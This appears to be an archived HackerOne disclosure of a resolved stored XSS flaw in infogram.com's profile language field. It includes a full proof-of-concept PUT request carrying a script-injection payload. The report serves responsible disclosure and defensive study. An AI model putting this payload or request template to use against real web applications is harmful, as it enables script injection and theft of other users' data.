---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2019-06-22
submitted: 2018-10-28T21:18:50.797Z
bounty_usd: null
votes: 20
cve: []
program: "[[programs/infogram|Infogram]]"
reporter: "theappsec"
source: "https://hackerone.com/reports/430029"
title: "Stored XSS in infogram.com via language "
---
# Stored XSS in infogram.com via language 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 20 | **Program:** Infogram | **Disclosed:** 2019-06-22

- Report: [https://hackerone.com/reports/430029](https://hackerone.com/reports/430029)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2018-10-28T21:18:50.797Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The stored XSS was found in the language profile parameter.

POC:
Change profile settings with following request:

```http
PUT /api/users/me HTTP/1.1
Host: infogram.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
csrf-token: **your token**
X-Requested-With: XMLHttpRequest
Content-Length: 135
DNT: 1
Connection: close
Cookie: **your cookies**

first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//
```
Go to your public profile link.

example: https://infogram.com/dd_ddt7

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **2018-10-29** @theappsec: Fast fix, good job!
- **Agreed On Going Public**
- **Report Became Public**
